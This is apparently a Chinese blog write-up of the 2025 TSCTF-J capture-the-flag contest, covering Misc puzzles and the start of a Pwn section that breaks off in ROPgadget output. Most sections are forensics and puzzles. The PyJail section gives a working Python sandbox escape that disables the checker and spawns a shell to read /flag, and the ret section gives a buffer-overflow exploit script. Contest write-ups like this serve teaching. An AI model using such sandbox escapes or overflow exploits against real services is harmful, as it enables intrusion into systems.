# 2025 TSCTF-J Writeup

**作为 BUPT 的新生，当然不能错过一年一届的 TSCTF-J，于是上号打了一下（虽然有点老登炸鱼的嫌疑**

**自从大一那时候的校赛后，就没尝试过一个人打全方向的题了**

**也算是一种复健运动吧，找找当初刚学 CTF 时那种热血的感觉**

&lt;!--more--&gt;

| ![](imgs/image-20251014114436663.png)&lt;br&gt;&lt;br&gt; |
| :-------------------------------------------: |

## Misc

### 题目名称 卢森堡的秘密

题目附件给了一张 PNG 图片，zsteg 一把梭了

![](imgs/image-20251010103004056.png)

`TSCTF-J{Th3_sEcre7_0f_L$B!}`

### 题目名称 Meow（一血）

题目附件给了一个 docx 文件，直接打开可以得到如下内容

![](imgs/image-20251010103110687.png)

改后缀为.zip，然后解压并打开可以得到如下提示：换了个base64的表

![](imgs/image-20251010103141983.png)

因此写个脚本解 base64 ，然后手动组合一下即可：``

```python
import base64
from itertools import permutations


custom_b64_alphabet = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#43;/&#34;
std_b64_alphabet   = &#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#43;/&#34;

def custom_b64decode(s):
    trans = str.maketrans(custom_b64_alphabet, std_b64_alphabet)
    s = s.translate(trans)
    missing_padding = len(s) % 4
    if missing_padding:
        s &#43;= &#39;=&#39; * (4 - missing_padding)
    return base64.b64decode(s)

lines = [
    &#34;vfndveyTsNSk&#34;,
    &#34;mv9bBq==&#34;,
    &#34;x01LB3Dnztb3&#34;,
    &#34;xZrFq2fu&#34;,
    &#34;iseHFq==&#34;
]

for line in lines:
    print(custom_b64decode(line))
    
# TSCTF-J{1_Am_4_CaT_MeowMe0w!!!}
```

### 题目名称 EzFix（一血）

题目附件给了一个Vmware虚拟机的虚拟磁盘镜像目录，我们主要关注 vmdk 文件

直接用 DiskGenius 挂载，在 TSCTF-J 用户的桌面上可以看到一个加密的压缩包和一个 PNG 图片

![](imgs/image-20251010103752210.png)

打开压缩包，Store&#43;ZipCrypto 很明显提示了明文攻击

![](imgs/image-20251010103847212.png)

我们用 bkcrack 利用 PNG 文件头进行明文攻击即可
```bash
echo 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header
bkcrack -C flag_part2.zip -c useless.png -p png_header -o 0
bkcrack -C flag_part2.zip -c useless.png -k e9ac551e 24d21c15 097eb913 -U out.zip 123
```

用密码123解压即可得到第二段 flag：`9ood_4t_B50D!!!Wdf9u}`

第一段 flag 直接 strings 就行（感觉可能是非预期

![](imgs/image-20251010104141528.png)

综上，最后的 flag：`TSCTF-J{w0w_Y0u_4rE_9ood_4t_B50D!!!Wdf9u}`

### 题目名称 秃头！真是！太棒啦！（一血）

题面信息如下：

&gt; 你的头发有什么用？快将这种没用的东西统统拿掉！让我看到最干净的你！
&gt; 
&gt; 请构建一个不超过100字节的ELF程序，使之可以输出字符串“秃头！真是！太棒啦！”。
&gt; 
&gt; 你可以使用附件中的solve.py协助你与服务器交互。

并且题目给了如下提示：

&gt; 目标字符串：b&#39;\xe7\xa7\x83\xe5\xa4\xb4\xef\xbc\x81\xe7\x9c\x9f\xe6\x98\xaf\xef\xbc\x81\xe5\xa4\xaa\xe6\xa3\x92\xe5\x95\xa6\xef\xbc\x81&#39;

网上找到了参考的汇编代码：https://gist.github.com/antsaasma/2578795

只不过它输出的是`Hello world`

```
  BITS 32
      org     0x00010000
  
      db      0x7F, &#34;ELF&#34;             ; e_ident
      dd      1                                       ; p_type
      dd      0                                       ; p_offset
      dd      $$                                      ; p_vaddr 
      dw      2                       ; e_type        ; p_paddr
      dw      3                       ; e_machine
      dd      _start                  ; e_version     ; p_filesz
      dd      _start                  ; e_entry       ; p_memsz
      dd      4                       ; e_phoff       ; p_flags
  _cont:
      mov     dl, string_len          ; e_shoff       ; p_align
      int     0x80                    
      mov     al, 1                   ; e_flags
      xor     bl,bl
      int     0x80                    ; e_ehsize
      dw      0x20                    ; e_phentsize
      dw      1                       ; e_phnum
  _start:
      mov     al, 04                  ; e_shentsize
      mov     bl, 01                  ; e_shnum
      mov     ecx, string_start       ; e_shstrndx
      jmp     _cont                   
  string_start:
      db &#34;Hello world&#34;, 0x0a
  string_len equ $ - string_start

  filesize      equ     $ - $$
```

对照上面的代码，修改一下然后编译即可

```
BITS 32
org 0x00010000

db 0x7F, &#34;ELF&#34;       ; e_ident
dd 1                 ; p_type
dd 0                 ; p_offset
dd $$                ; p_vaddr 
dw 2                 ; e_type
dw 3                 ; e_machine
dd _start            ; e_version
dd _start            ; e_entry
dd 4                 ; e_phoff
_cont:
mov dl, string_len   ; e_shoff
int 0x80                    
mov al, 1            ; e_flags
xor ebx, ebx
int 0x80             ; e_ehsize
dw 0x20              ; e_phentsize
dw 1                 ; e_phnum
_start:
mov al, 4            ; e_shentsize
mov bl, 1            ; e_shnum
mov ecx, string_start ; e_shstrndx
jmp _cont                   
string_start:
db 0xe7,0xa7,0x83,0xe5,0xa4,0xb4,0xef,0xbc,0x81,0xe7,0x9c,0x9f,0xe6,0x98,0xaf,0xef,0xbc,0x81,0xe5,0xa4,0xaa,0xe6,0xa3,0x92,0xe5,0x95,0xa6,0xef,0xbc,0x81, 0x0a
string_len equ $ - string_start

filesize equ $ - $$
```

```bash
nasm -f bin -o test.elf test.asm
```

```python
from pwn import *

p = remote(&#39;127.0.0.1&#39;, 49345)

f = open(&#39;test.elf&#39;, &#39;rb&#39;)
content = f.read()
f.close()

print(f&#34;ELF 文件大小: {len(content)} 字节&#34;)

p.recvuntil(&#39;“秃头！真是！太棒啦！”\n&#39;.encode())
p.send(content)

p.interactive()
```

![](imgs/image-20251010135533526.png)

### 题目名称  BadFile（一血）

题面信息如下：

&gt; 在附件的每个文件夹内各有100份文件，其中各有5份存在隐私泄露或恶意代码，请你找出这15份文件，按照txt,wav,pdf的文件类型顺序，将文件名（带后缀）按照字典序用_连接后计算md5值，并使用TSCTF-J{}包裹后提交。

对于 txt 文件，100 个完全可以手动一个个查看，基本上就是手机号、地址、身份证号这些

![](imgs/image-20251011114459989.png)

对于 PDF 文件，我们可以用以下命令转为 txt 文件，然后按照大小降序排列

```bash
mkdir -p txt &amp;&amp; for f in *.pdf; do strings &#34;$f&#34; &gt; &#34;txt/${f%.pdf}.txt&#34;; done
```

然后就能看到 XSS 注入的恶意代码

![](imgs/image-20251011114700038.png)

对于 wav 文件，先按大小排列能找出四个，剩下的最后一个语音转文字一个个看就行

```python
import os
import whisper

model = whisper.load_model(&#34;base&#34;)

filelist = os.listdir(&#39;wav&#39;)
# print(filelist)
for filename in filelist:
    filepath = &#39;./wav/&#39; &#43; filename
    result = model.transcribe(filepath, language=&#39;zh&#39;)
    print(filepath,result[&#34;text&#34;])
```

最后找出来的文件是下面代码里这几个，写个脚本排序然后算一下 MD5 即可

```python
import hashlib

txtfile = &#34;3WQlwSaj.txt dubZ3AZn.txt nhlbNxGL.txt qtFyaGkZ.txt wlBUCOeg.txt&#34;.split()
wavfile = &#34;2JuiKL42.wav 4UjLqeRF.wav Ew24ldS2.wav HjRtD6f3.wav RtUwEgj1.wav&#34;.split()
pdffile = &#34;8YmxZRca.pdf mFU1SdVp.pdf w9V1ZDEd.pdf xdBqKtxe.pdf Z8P4DHre.pdf&#34;.split()

txtfile_sorted = sorted(txtfile)
wavfile_sorted = sorted(wavfile) 
pdffile_sorted = sorted(pdffile)

print(&#34;排序后的文件:&#34;)
print(&#34;TXT:&#34;, txtfile_sorted)
print(&#34;WAV:&#34;, wavfile_sorted)
print(&#34;PDF:&#34;, pdffile_sorted)

combined = txtfile_sorted &#43; wavfile_sorted &#43; pdffile_sorted
filename_string = &#34;_&#34;.join(combined)
print(f&#34;\n连接后的字符串: {filename_string}&#34;)

md5_hash = hashlib.md5(filename_string.encode(&#39;utf-8&#39;)).hexdigest()
print(f&#34;\nMD5 值: {md5_hash}&#34;)
# MD5 值: 0b4a2a6431f6b94b3c1d3d50d0a45aea
```

`TSCTF-J{0b4a2a6431f6b94b3c1d3d50d0a45aea}`

### 题目名称  PyJail（一血）

题目改自 2025 Mini-L CTF PyJail

附件给的源代码如下

```python
import socketserver
import sys
import ast
import io


class ASTChecker(ast.NodeVisitor):
    def visit_Attribute(self, node):
        if isinstance(node.attr, str) and node.attr.startswith(&#34;__&#34;):
            raise ValueError(&#34;Cannot access private attributes&#34;)
        self.generic_visit(node)

def execute_safely(code: str, safe_globals=None):
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr

    sys.stdout = io.StringIO()
    sys.stderr = io.StringIO()

    if safe_globals is None:
        safe_globals = {
            &#34;__builtins__&#34;: {
                &#34;print&#34;: print,
                &#34;any&#34;: any,
                &#34;len&#34;: len,
                &#34;RuntimeError&#34;: RuntimeError,
                &#34;addaudithook&#34;: sys.addaudithook,
                &#34;original_stdout&#34;: sys_stdout,
                &#34;original_stderr&#34;: sys_stderr
            }
        }

    try:
        parsed_tree = ast.parse(code)
        ASTChecker().visit(parsed_tree)

        exec(code, safe_globals)
        output = sys.stdout.getvalue()

        sys.stdout = sys_stdout
        sys.stderr = sys_stderr

        return output, safe_globals
    except Exception as error:
        sys.stdout = sys_stdout
        sys.stderr = sys_stderr
        return f&#34;Error: {str(error)}&#34;, safe_globals

AUDIT_CODE = &#34;&#34;&#34;
def audit_monitor(event, args):
    restricted_actions = [
        &#34;import&#34;, &#34;time.sleep&#34;, &#34;builtins.input&#34;, &#34;builtins.input/result&#34;, &#34;open&#34;, &#34;os.system&#34;,
        &#34;eval&#34;, &#34;subprocess.Popen&#34;, &#34;subprocess.call&#34;, &#34;subprocess.run&#34;, &#34;subprocess.check_output&#34;
    ]
    if event in restricted_actions or event.startswith(&#34;subprocess.&#34;):
        raise RuntimeError(f&#34;Action blocked: {event}&#34;)

addaudithook(audit_monitor)
&#34;&#34;&#34;

class ClientHandler(socketserver.BaseRequestHandler):
    def _send_welcome(self):
        self.request.sendall(b&#34;Welcome to the Python Sandbox!\n&#34;)
        self.request.sendall(b&#34;Rules: No imports, no sleep, no input allowed\n\n&#34;)

    def _process_client_input(self, audit_code, safe_globals):
        while True:
            self.request.sendall(b&#34;&gt;&gt;&gt; &#34;)
            try:
                client_code = self.request.recv(4096).decode().strip()
                if not client_code:
                    continue
                if client_code.lower() == &#34;exit&#34;:
                    self.request.sendall(b&#34;Goodbye!\n&#34;)
                    break

                complete_code = audit_code &#43; client_code &#43; &#34;\n&#34;
                audit_code = &#34;&#34;

                result, safe_globals = execute_safely(complete_code, safe_globals)
                self.request.sendall(result.encode() &#43; b&#34;\n&#34;)
            except Exception as error:
                self.request.sendall(f&#34;Error: {str(error)}\n&#34;.encode())
                break

    def handle(self):
        self._send_welcome()
        self.request.sendall(b&#34;Enter your code line by line. Use &#39;exit&#39; to disconnect.\n\n&#34;)

        audit_code = AUDIT_CODE
        safe_globals = None
        self._process_client_input(audit_code, safe_globals)

if __name__ == &#34;__main__&#34;:
    HOST, PORT = &#34;0.0.0.0&#34;, 8000
    with socketserver.ThreadingTCPServer((HOST, PORT), ClientHandler) as server:
        print(f&#34;Server running on {HOST}:{PORT}&#34;)
        server.serve_forever()
```

网上找到官方WP：https://blog.csdn.net/2301_80160378/article/details/148563157

还有一篇关于栈帧沙箱逃逸的参考文章：https://www.cnblogs.com/gaorenyusi/p/18242719

只能说是几乎一模一样，出题人就改了个函数名，因此我们直接对着改就好了

```bash
a = (a.gi_frame.f_back.f_back for i in [1])
a = [x for x in a][0]
globals[&#39;ASTChecker&#39;].visit_Attribute=lambda x,y:None
os=globals[&#34;__builtins__&#34;].__import__(&#34;os&#34;)
sys=globals[&#34;__builtins__&#34;].__import__(&#34;sys&#34;)
iter=globals[&#34;__builtins__&#34;].iter
exec=globals[&#34;__builtins__&#34;].exec
a=&#39;run_command = lambda cmd: ((lambda r, w, pid: ((pid == 0 and (os.close(r), os.dup2(w,&#39;
a&#43;=&#39;original_stdout.fileno()),os.dup2(w, original_stdout.fileno()),os.execlp(&#34;/bin/sh&#34;, &#34;sh&#34;&#39;
a&#43;=&#39;, &#34;-c&#34;, cmd) )) or (os.close(w), (output :=b&#34;&#34;.join(iter(lambda: os.read(r, 4096), b&#34;&#34;))&#39;
a&#43;=&#39;.decode()),os.close(r), os.waitpid(pid, 0),output )[4] ))(*os.pipe(), os.fork()))&#39;
exec(a)
print(run_command(&#39;cat /flag&#39;))
```

![](imgs/image-20251011220235755.png)

### 题目名称 ListLoadMaster（一血）

题面信息如下：

&gt; Do you know how to create list in Python?
&gt; 
&gt; Python-3.12 x64

附件给的源代码如下：

```python
import ast
import socket
from sys import getsizeof

host = &#34;0.0.0.0&#34;
port = 8000
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(1)
conn, addr = server.accept()

class SafeListExec:
    def __init__(self):
        self.safe_globals = {&#34;range&#34;: range, &#34;list&#34;: list}
        self.safe_locals = {}

    def check_expr(self, node):
        if isinstance(node, ast.Constant):
            return isinstance(node.value, (int, float, str, bool, type(None)))
        elif isinstance(node, ast.List):
            return all(self.check_expr(elt) for elt in node.elts)
        elif isinstance(node, ast.BinOp) and isinstance(node.op, ast.Mult):
            return self.check_expr(node.left) and self.check_expr(node.right)
        elif isinstance(node, ast.ListComp):
            if not self.check_expr(node.elt):
                return False
            for gen in node.generators:
                if not isinstance(gen.target, ast.Name) or gen.target.id != &#34;_&#34;:
                    return False
                if not (isinstance(gen.iter, ast.Call) and isinstance(gen.iter.func, ast.Name)
                        and gen.iter.func.id == &#34;range&#34; and all(self.check_expr(arg) for arg in gen.iter.args)):
                    return False
                for cond in gen.ifs:
                    if not self.check_expr(cond):
                        return False
            return True
        elif isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name):
                if node.func.id in {&#34;list&#34;, &#34;range&#34;}:
                    return all(self.check_expr(arg) for arg in node.args)
        return False

    def check_stmt(self, node):
        if isinstance(node, ast.Assign):
            if len(node.targets) != 1 or not isinstance(node.targets[0], ast.Name):
                return False
            return self.check_expr(node.value)
        elif isinstance(node, ast.Expr) and isinstance(node.value, ast.Call):
            call = node.value
            if isinstance(call.func, ast.Attribute):
                if isinstance(call.func.value, ast.Name) and call.func.attr in {&#34;append&#34;, &#34;extend&#34;}:
                    return all(self.check_expr(arg) for arg in call.args)
            return False
        return False

    def exec(self, code: str):
        tree = ast.parse(code, mode=&#34;exec&#34;)
        for node in tree.body:
            if not self.check_stmt(node):
                raise ValueError(&#34;Not allowed statements: &#34; &#43; ast.dump(node))
        exec(compile(tree, &#34;&lt;ast&gt;&#34;, &#34;exec&#34;), self.safe_globals, self.safe_locals)
        return self.safe_locals


def check_list_dim(lst):
    if not isinstance(lst, list):
        raise ValueError(&#34;The input must be a list&#34;)
    if not lst:
        return 1
    if all(not isinstance(x, list) for x in lst):
        return 1
    if all(isinstance(x, list) and all(not isinstance(y, list) for y in x) for x in lst):
        return 2
    raise ValueError(&#34;Only one-dimensional or two-dimensional lists are allowed and cannot be mixed&#34;)

def count_elements(lst):
    if not isinstance(lst, list):
        raise ValueError(&#34;The input must be a list&#34;)
    if not lst:
        return 0
    if all(not isinstance(x, list) for x in lst):
        return len(lst)
    if all(isinstance(x, list) and all(not isinstance(y, list) for y in x) for x in lst):
        return sum(len(x) for x in lst)
    raise ValueError(&#34;Only one-dimensional or two-dimensional lists are allowed and cannot be mixed&#34;)


def get_input(dim):
    conn.sendall(b&#34;&gt;&gt; &#34;)
    code = conn.recv(4096).decode().strip()

    if not code.startswith(&#34;lst&#34;):
        raise ValueError(&#34;The code must start with &#39;lst&#39;&#34;)

    executor = SafeListExec()
    local_vars = executor.exec(code)
    if &#34;lst&#34; not in local_vars:
        raise ValueError(&#34;The variable &#39;lst&#39; must be defined in the code&#34;)

    lst = local_vars[&#34;lst&#34;]
    assert check_list_dim(lst) == dim, &#34;Dimension does not meet the requirements&#34;

    return lst


def challenge_one():
    lst_a = get_input(1)
    length = count_elements(lst_a)
    if not getsizeof(lst_a) == 96:
        exit(1)

    lst_b = get_input(1)
    len_b = count_elements(lst_b)
    if len_b != length or (not getsizeof(lst_b) == 104):
        exit(1)

    lst_c = get_input(1)
    len_c = count_elements(lst_c)
    if len_c != length or (not getsizeof(lst_c) == 120):
        exit(1)

    conn.sendall(b&#34;Challenge 1 passed!\n&#34;)

def challenge_two():
    lst_a = get_input(2)
    length = count_elements(lst_a)
    if not getsizeof(lst_a) == 64:
        exit(1)

    lst_b = get_input(2)
    len_b = count_elements(lst_b)
    if len_b != length or (not getsizeof(lst_b) == 96):
        exit(1)

    lst_c = get_input(2)
    len_c = count_elements(lst_c)
    if len_c != length or (not getsizeof(lst_c) == 120):
        exit(1)

    conn.sendall(b&#34;Challenge 2 passed!\n&#34;)

try:
    challenge_one()
    challenge_two()
except (ValueError, AssertionError) as e:
    conn.sendall(f&#34;{e}&#34;.encode())
    conn.close()
    server.close()
    exit(1)

flag = open(&#34;/flag&#34;, &#34;r&#34;, encoding=&#34;utf-8&#34;).read().strip()
conn.sendall(f&#34;Congratulations! Here is your flag: {flag}\n&#34;.encode())
conn.close()
server.close()
```

分析下代码，发现题目的意思就是在通过题目安全检测的前提下，

分别生成三个元素个数相同，但是所占内存空间大小不同的一维和二维列表

参考链接：https://github.com/python/cpython/blob/0fb18b02c8ad56299d6a2910be0bab8ad601ef24/Objects/listobject.c

```python
from sys import getsizeof

# Challenge 1
lst = [0] * 5 # 96
lst = list(range(5)) # 104
lst = [0 for _ in range(5)] # 120

# Challenge 2
lst = [[0]*6] # 64
lst = [[0]*6, [], [], [],[]] # 96
lst = [[0,0,0], [0,0,0]];lst.append([]) # 120

print(lst)
print(getsizeof(lst))
```

![](imgs/image-20251011224241726.png)


### 题目名称 QQGroup

题面信息如下:

&gt; How to join a QQ group?By Searching?Or not! I and D is useful!
&gt; 
&gt; Flag matches the following regular expression:^TSCTF-J\{[a-zA-Z0-9_#!]&#43;\}$

根据题面提示先异或一下 I 和 D，可以得到一张字节顺序被修改过的 PNG 图片

![](imgs/image-20251011115410877.png)

写个脚本还原一下

```python
def reverse_8bytes(data):
    with open(&#34;download.dat&#34;,&#39;rb&#39;) as f:
        data = f.read()
        
    reversed_blocks = []
    for i in range(0, len(data), 8):
        block = data[i:i&#43;8]
        reversed_block = block[::-1]  # reverse the 8-byte block
        reversed_blocks.append(reversed_block)
        
    res = b&#39;&#39;.join(reversed_blocks)
    # print(res[:100])
    with open(&#34;output.png&#34;,&#39;wb&#39;) as f:
        f.write(res)
```

还原后可以得到下图

![](imgs/image-20251011115523547.png)

图片看起来有点暗，放大后发现是一明一暗的像素交错的

![](imgs/image-20251011115600372.png)

这其实是一种图片隐写：[光棱坦克](https://www.52pojie.cn/thread-2051184-1-1.html)

如果没听说过也没关系，自己手搓个脚本交错提取出像素点也行

```python
from PIL import Image
import itertools
from pathlib import Path
import posixpath
import sys


def detect_stripe_modulus(img: Image.Image, max_modulus=6, threshold=0.4):
    img = img.convert(&#34;L&#34;)
    pixels = img.load()
    height, width = img.size

    best_score = 0
    best_mod = 2
    best_xoff = 1

    for xoff in range(1, max_modulus &#43; 1):
        for x_mod in range(2, max_modulus &#43; 1):
            score = 0
            total = 0
            for y in range(0, height, 6):
                for x in range(0, width, 9):
                    if (x &#43; y * xoff) % (x_mod) == 0:
                        if pixels[y, x] / 255 &lt; threshold:
                            score &#43;= 1
                        total &#43;= 1
                    else:
                        if pixels[y, x] / 255 &gt;= threshold:
                            score &#43;= 1
                        total &#43;= 1

            match_ratio = score / total
            print(xoff, x_mod, &#34;match_ratio&#34;, score, match_ratio)
            if match_ratio &gt; best_score:
                best_score = match_ratio
                best_mod = x_mod
                best_xoff = xoff
            if match_ratio == 1:
                break

    return best_mod, best_xoff


def get_circle_pixels(center_x, center_y, r, max_x, max_y):
    &#34;&#34;&#34;
    使用中点圆算法生成圆环上的所有整数坐标点（去重）
    返回: set of (x, y) 整数坐标
    &#34;&#34;&#34;
    points = set()
    x = 0
    y = int(r &#43; 0.5)
    p = 1 - y

    def add_symmetric_points(cx, cy, x, y):
        &#34;&#34;&#34;添加8个对称点&#34;&#34;&#34;
        points.add((cx &#43; x, cy &#43; y))
        points.add((cx - x, cy &#43; y))
        points.add((cx &#43; x, cy - y))
        points.add((cx - x, cy - y))
        points.add((cx &#43; y, cy &#43; x))
        points.add((cx - y, cy &#43; x))
        points.add((cx &#43; y, cy - x))
        points.add((cx - y, cy - x))

    add_symmetric_points(center_x, center_y, x, y)

    while x &lt; y:
        x &#43;= 1
        if p &lt; 0:
            p &#43;= 2 * x &#43; 1
        else:
            y -= 1
            p &#43;= 2 * (x - y) &#43; 1
        add_symmetric_points(center_x, center_y, x, y)

    return set([p for p in points if 0 &lt;= p[0] &lt; max_x and 0 &lt;= p[1] &lt; max_y])


def extract_both_images(p, xoff=None, xmod=None):
    path = Path(p)
    ori = Image.open(path)
    
    # 确保图像是RGBA模式
    if ori.mode != &#39;RGBA&#39;:
        ori = ori.convert(&#39;RGBA&#39;)
    
    # 创建里图和表图的画布
    inner_image = Image.new(&#39;RGBA&#39;, ori.size)
    outer_image = Image.new(&#39;RGBA&#39;, ori.size)
    
    inner_pixels = inner_image.load()
    outer_pixels = outer_image.load()
    
    print(xoff, xmod)
    
    if xmod is None or xoff is None:
        xmod, xoff = detect_stripe_modulus(ori)
    
    print(&#34;检测到的参数:&#34;, xoff, xmod, ori.size)
    
    # === 提取里图 ===
    print(&#34;正在提取里图...&#34;)
    lmax = 0
    
    # 第一遍：计算里图的最大RGB值
    for y, x in itertools.product(*[range(r) for r in ori.size[::-1]]):
        if not (x &#43; y * xoff) % (xmod) == 0:
            continue
        r, g, b, a = ori.getpixel((x, y))
        lmax = max(r, g, b, lmax)
    
    amp = 255 / lmax if lmax &gt; 0 else 1
    print(f&#34;里图最大亮度: {lmax}, 放大系数: {amp}&#34;)

    # 第二遍：增强里图的采样点
    for y, x in itertools.product(*[range(r) for r in ori.size[::-1]]):
        if not (x &#43; y * xoff) % (xmod) == 0:
            continue
        r, g, b, a = ori.getpixel((x, y))
        r = int(min(r * amp, 255))
        g = int(min(g * amp, 255))
        b = int(min(b * amp, 255))
        inner_pixels[x, y] = (r, g, b, a)

    # 第三遍：填充里图的非采样点
    for y, x in itertools.product(*[range(r) for r in ori.size[::-1]]):
        if (x &#43; y * xoff) % (xmod) == 0:
            continue
        
        n = 0
        r, g, b, a = (0, 0, 0, 0)
        radius = 1
        while n == 0:
            for rx, ry in get_circle_pixels(x, y, radius, ori.size[0], ori.size[1]):
                if not (rx &#43; ry * xoff) % (xmod) == 0:
                    continue
                rr, gg, bb, aa = inner_image.getpixel((rx, ry))
                r &#43;= rr
                g &#43;= gg
                b &#43;= bb
                a &#43;= aa
                n &#43;= 1
            radius &#43;= 1
        
        if n &gt; 0:
            inner_pixels[x, y] = (r // n, g // n, b // n, a // n)
        else:
            inner_pixels[x, y] = ori.getpixel((x, y))

    # === 提取表图 ===
    print(&#34;正在提取表图...&#34;)
    
    # 表图就是去除里图增强效果后的原始图像
    # 但对于条纹位置的像素，我们需要恢复其原始外观
    
    for y, x in itertools.product(*[range(r) for r in ori.size[::-1]]):
        r, g, b, a = ori.getpixel((x, y))
        
        # 如果是条纹位置，可能需要调整以显示表图的完整外观
        # 这里我们直接使用原始像素值，但可以做一些调整让表图更清晰
        if (x &#43; y * xoff) % (xmod) == 0:
            # 条纹位置：稍微增强对比度让表图更明显
            factor = 1.2
            r = int(min(r * factor, 255))
            g = int(min(g * factor, 255))
            b = int(min(b * factor, 255))
        
        outer_pixels[x, y] = (r, g, b, a)

    # 保存图像
    base_name = posixpath.splitext(path.name)[0]
    inner_image.save(path.parent / f&#34;{base_name}_inner.png&#34;)
    outer_image.save(path.parent / f&#34;{base_name}_outer.png&#34;)
    
    print(f&#34;提取完成！&#34;)
    print(f&#34;里图保存为: {base_name}_inner.png&#34;)
    print(f&#34;表图保存为: {base_name}_outer.png&#34;)
    
    return inner_image, outer_image


def create_comparison_image(inner, outer):
    &#34;&#34;&#34;创建对比图像，左右显示里图和表图&#34;&#34;&#34;
    width = inner.size[0] * 2
    height = inner.size[1]
    
    comparison = Image.new(&#39;RGBA&#39;, (width, height))
    
    # 左边放里图，右边放表图
    comparison.paste(inner, (0, 0))
    comparison.paste(outer, (inner.size[0], 0))
    
    return comparison


if __name__ == &#34;__main__&#34;:
    # 直接处理output.png文件
    input_file = &#34;output.png&#34;
    
    if Path(input_file).exists():
        print(f&#34;正在处理 {input_file}...&#34;)
        if len(sys.argv) == 3:
            # 如果提供了参数：python script.py x_offset x_modulus
            inner, outer = extract_both_images(input_file, int(sys.argv[1]), int(sys.argv[2]))
        else:
            # 自动检测模式
            inner, outer = extract_both_images(input_file)
        
        # 创建对比图
        comparison = create_comparison_image(inner, outer)
        comparison.save(&#34;comparison.png&#34;)
        print(f&#34;对比图保存为: comparison.png&#34;)
        
    else:
        print(f&#34;错误：找不到文件 {input_file}&#34;)
        print(&#34;请确保output.png存在于当前目录&#34;)
```

提取出来后可以得到下面这两张图片，分别是表图和里图


| ![](imgs/image-20251012233500170.png)&lt;br&gt;&lt;br&gt; | ![](imgs/image-20251012233505728.png)&lt;br&gt;&lt;br&gt; |
| :-------------------------------------------: | :-------------------------------------------: |

仔细看会发现里图里的QQ群的群号和表图是不一样的，而且隐藏了群聊名称

QQ 上搜索`1060905286`会发现搜不到这个群，猜测是群主关闭了通过群号和关键字搜索

后续需要我们加群获得进一步的信息，不能通过搜索群号加群，这里提供另外两种方法

第一种就是参考[这篇文章](https://blog.csdn.net/u014374009/article/details/105385887)，利用移动端跳转的API，跳转到加群页面

&gt; mqqapi://card/show_pslcard?src_type=internal&amp;version=1&amp;card_type=group&amp;uin=1060905286

第二种就是参考[这篇博客](https://cabelis.ink/2023/01/16/crash-qrcode-by-hand/)，修复二维码后扫码加群

![](imgs/image-20251013222642047.png)

发现加群需要正确回答问题，于是这一步才到 OSINT 社工的部分

![](imgs/image-20251013222747240.png)

通过社工找到[出题人的博客](https://sus-morn.tech/)，点击`新生常见问题解答`这篇文章，可以发现招新赛跳转的链接是有问题的

提示了我们一个 Github Commit 的 hash

![](imgs/image-20251013225547631.png)

 因此我们可以直接在 Github 上搜这个 hash

![](imgs/image-20251013225738669.png)

可以定位到具体的仓库，最后在 URL 中的 commit 后跟上这个 hash 值即可得到群问题的答案：`‬‌‌‌‌‍‬‍‍u_answer_here`

![](imgs/image-20251013225511184.png)

直接复制这个答案加群会发现回答错误，仔细数了一下字数发现不太对

![](imgs/image-20251014175818276.png)

原来是藏了零宽，手动输入答案 (13字符) 后即可成功加入群聊

![](imgs/image-20251014175900071.png)

加入群聊后查看群公告即可得到最后的 flag：`TSCTF-J{f4k3_fl4g_f1nd_4n0nth3r_pl5!!!}`

![](imgs/image-20251014180133130.png)

## Pwn

### 题目名称 ret

ret2text，直接给了后门

![](imgs/image-20251010110150140.png)

```python
from pwn import *

context.arch = &#39;amd64&#39;
context.log_level = &#39;info&#39;

p = remote(&#39;127.0.0.1&#39;, 61515)  # 如果是远程题目
backdoor_addr = 0x0400676

offset = 16 &#43; 8
payload = b&#39;A&#39; * offset  # 填充缓冲区 &#43; rbp
payload &#43;= p64(backdoor_addr)  # 覆盖返回地址为 backdoor

p.sendlineafter(b&#34;Just a simple sign-in!&#34;, payload)
p.interactive()
```

![](imgs/image-20251010110039246.png)

### 题目名称 Easy-syscall

```bash
(base) ➜  Downloads ROPgadget --binary pwn
Gadgets information
============================================================
0x00000000004010eb : add bh, bh ; loopne 0x401155 ; nop ; ret
0x00000000004010bc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401221 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040115a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004010be : add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401223 : add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401183 : add byte ptr [rax], al ; syscall
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040115b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401159 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004010ea : add dil, dil ; loopne 0x401155 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401157 : add eax, 0x2efb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x00000000004011bf : call qword ptr [rax &#43; 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401173 : cli ; jmp 0x401100
0x00000000004010c3 : cli ; ret
0x000000000040122b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401170 : endbr64 ; jmp 0x401100
0x00000000004010c0 : endbr64 ; ret
0x000000000040117d : in eax, 0x48 ; mov eax, 0xf ; syscall
0x0000000000401012 : je 0x401016 ; call rax
0x00000000004010e5 : je 0x4010f0 ; mov edi, 0x404040 ; jmp rax
0x0000000000401127 : je 0x401130 ; mov edi, 0x404040 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401174 : jmp 0x401100
0x000000000040100b : jmp 0x4840103f
0x00000000004010ec : jmp rax
0x00000000004011c1 : leave ; ret
0x00000000004010ed : loopne 0x401155 ; nop ; ret
